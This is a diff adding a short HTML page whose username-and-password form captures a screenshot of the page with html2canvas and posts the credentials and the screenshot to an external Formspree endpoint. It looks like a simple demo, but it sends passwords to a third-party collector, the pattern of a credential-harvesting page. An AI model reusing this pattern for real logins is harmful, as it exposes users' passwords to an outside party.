@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form with Screenshot Submission</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <form id="myForm">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" required><br>
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Take a screenshot of the page
+            html2canvas(document.body).then(function(canvas) {
+                var screenshot = canvas.toDataURL(); // Convert canvas to base64 encoded image
+
+                // Create a hidden input field to store the screenshot
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'screenshot';
+                input.value = screenshot;
+                document.getElementById('myForm').appendChild(input);
+
+                // Submit the form data to Formspree
+                var form = document.getElementById("myForm");
+                var formData = new FormData(form);
+
+                fetch("https://formspree.io/f/xbjqqojp", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("Form submitted successfully!");
+                        // Formspree will handle redirection to the thank you page
+                    } else {
+                        throw new Error("Form submission failed!");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Form submission failed!");
+                });
+            });
+        });
+    </script>
+</body>
+</html>
